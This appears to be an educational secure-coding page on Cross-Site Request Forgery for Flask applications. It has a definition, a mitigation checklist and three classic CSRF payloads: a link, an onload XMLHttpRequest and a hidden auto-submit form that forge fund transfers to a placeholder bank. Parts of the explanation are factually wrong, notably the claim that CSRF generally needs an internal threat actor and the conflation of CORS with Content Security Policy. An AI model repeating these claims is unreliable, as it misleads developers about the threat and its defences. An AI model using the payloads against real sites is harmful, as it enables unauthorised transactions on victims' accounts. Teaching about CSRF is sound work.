# Cross-Site Request Forgery (CSRF)

Cross-Site Request Forgery (CSRF) is an attack that forces an end user to execute unwanted actions on a web application in which they’re currently authenticated. With a little help of social engineering (such as sending a link via email or chat), an attacker may trick the users of a web application into executing actions of the attacker’s choosing. If the victim is a normal user, a successful CSRF attack can force the user to perform state-changing requests like transferring funds, changing their email address, and so forth. If the victim is an administrative account, CSRF can compromise the entire web application. A CSRF attack generally requires an internal threat actor to provide insight into the internal workings of the API or system, which makes it one of the more challenging cyber vulnerabilities to mitigate.

## How to secure against this attack

Implement [Flask WTForms](https://flask-wtf.readthedocs.io/en/1.2.x/), which generates and requires a unique secret key by default.
- Implement business knowledge access levels.
- End-user education.
- HTTPS encryption.
- End-user education.
- Implement a CORS Content Security Policy (CSP).
- Understand how the attack can be executed in the specific context of the application and user, then code review with specific scenarios in mind.
- Implement three-factor authentication (3FA) for administrative operations.
- Separate production and development environments.
- White-list firewall policies

## Example Attack Code

> [!NOTE]
> Due to the specific, targeted and complex nature of a CSRF it is difficult to demonstrate this attack beyond the below code snippets practically. When reading them, you should assume that the code is executed from a side attack email or document (usually a \*.PDF or macro-enabled \*.xlsx) where the user has already authenticated to the API or system and the code will be validated  `True` by the API or system allowing the malicious code to execute successfully.

```html
    <a href="http://bank.com/transfer.do?acct=MARIA&amount=100000">View my Pictures!</a>
```

``` html
    <script>
    function put() {
        var x = new XMLHttpRequest();
        x.open("PUT","http://bank.com/transfer.do",true);
        x.setRequestHeader("Content-Type", "application/json");
        x.send(JSON.stringify({"acct":"BOB", "amount":100})); 
    }
    </script>
    <body onload="put()">
```

```html
    <form action="http://bank.com/transfer.do" method="POST">
    <input type="hidden" name="acct" value="MARIA"/>
    <input type="hidden" name="amount" value="100000"/>
    <input type="submit" value="View my pictures"/>
    </form>
```
